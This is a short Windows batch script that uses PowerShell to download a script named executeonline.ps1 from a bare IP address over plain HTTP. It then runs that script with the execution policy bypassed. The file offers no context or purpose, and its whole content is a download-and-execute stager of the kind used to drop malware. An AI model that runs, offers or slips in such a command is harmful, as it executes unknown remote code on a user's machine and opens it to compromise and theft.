@echo off
echo Downloading PowerShell script...
powershell -Command "Invoke-WebRequest -Uri 'http://185.196.8.73:8000/executeonline.ps1' -OutFile 'executeonline.ps1'"

echo Running downloaded PowerShell script...
powershell -ExecutionPolicy Bypass -File "executeonline.ps1"

echo Script execution completed.
pause
